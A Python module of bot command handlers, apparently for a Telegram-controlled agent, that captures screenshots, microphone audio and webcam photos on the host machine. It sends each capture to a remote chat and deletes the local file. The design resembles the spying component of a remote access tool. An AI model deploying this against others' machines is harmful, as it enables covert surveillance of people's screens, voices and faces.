"""Media capture handlers"""
import os
from utils.media_capture import take_screenshot, record_audio, capture_webcam_photo

def handle_screenshot(bot, message):
    """Handle screenshot request"""
    try:
        screenshot_path = take_screenshot()
        
        if screenshot_path and os.path.exists(screenshot_path):
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(screenshot_path)
        else:
            bot.send_message(message.chat.id, "Could not take screenshot. Make sure scrot, gnome-screenshot, or ImageMagick is installed.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

def handle_audio_recording(bot, message):
    """Handle audio recording"""
    try:
        # Parse duration from command
        parts = message.text.split()
        duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
        duration = min(duration, 60)  # Max 60 seconds
        
        bot.send_message(message.chat.id, f"Recording audio for {duration} seconds...")
        
        audio_path = record_audio(duration)
        
        if audio_path and os.path.exists(audio_path):
            with open(audio_path, 'rb') as audio:
                bot.send_audio(message.chat.id, audio)
            os.remove(audio_path)
        else:
            bot.send_message(message.chat.id, "Could not record audio. Make sure alsa-utils is installed.")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

def handle_webcam_photo(bot, message):
    """Handle webcam photo capture"""
    try:
        photo_path = capture_webcam_photo()
        
        if photo_path and os.path.exists(photo_path):
            with open(photo_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove(photo_path)
        else:
            bot.send_message(message.chat.id, "Could not capture photo. Make sure fswebcam is installed.")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")
